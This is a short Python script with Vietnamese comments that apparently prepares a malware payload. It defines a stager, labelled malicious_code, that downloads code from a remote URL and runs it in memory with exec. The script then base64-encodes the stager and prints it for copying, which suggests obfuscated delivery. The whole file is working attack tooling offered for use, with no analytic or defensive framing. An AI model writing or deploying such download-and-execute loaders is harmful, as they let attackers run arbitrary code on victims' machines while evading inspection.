import base64

malicious_code = r"""
import urllib.request

def run_stager(): 
    PAYLOAD_URL = ""
    try:
        req = urllib.request.Request(PAYLOAD_URL)
        response = urllib.request.urlopen(req)
        
        memory_payload = response.read().decode('utf-8')
        print("[*] Payload fetched into RAM. Size:", len(memory_payload), "bytes") 
        exec(memory_payload, globals())
    except Exception as e:
        print(f"[!] Transport error: {e}")
if __name__ == "__main__":
    run_stager()
"""

def encode_to_base64(python_code: str) -> str:
    """Hàm biến đổi code Python thành chuỗi Base64"""
    
    code_bytes = python_code.encode('utf-8')
    
    
    base64_bytes = base64.b64encode(code_bytes)
    
    
    base64_string = base64_bytes.decode('utf-8')
    
    return base64_string

if __name__ == "__main__":
  
    result = encode_to_base64(malicious_code)
    print("=== COPY CHUỖI BÊN DƯỚI ===")
    print(result)
   